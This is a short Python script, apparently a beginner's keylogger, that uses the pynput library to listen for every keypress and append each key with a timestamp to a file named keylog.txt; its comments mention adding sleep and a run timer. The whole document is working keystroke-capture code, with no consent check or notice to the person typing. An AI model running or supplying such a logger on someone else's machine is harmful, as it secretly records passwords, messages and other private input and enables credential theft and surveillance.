from pynput.keyboard import Key, Listener
import logging
import time
# added time to put some sleep
# can add timer on how many times keylog runs


logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press_key(key):
    logging.info(str(key))


with Listener(on_press=on_press_key) as listener:
    listener.join()
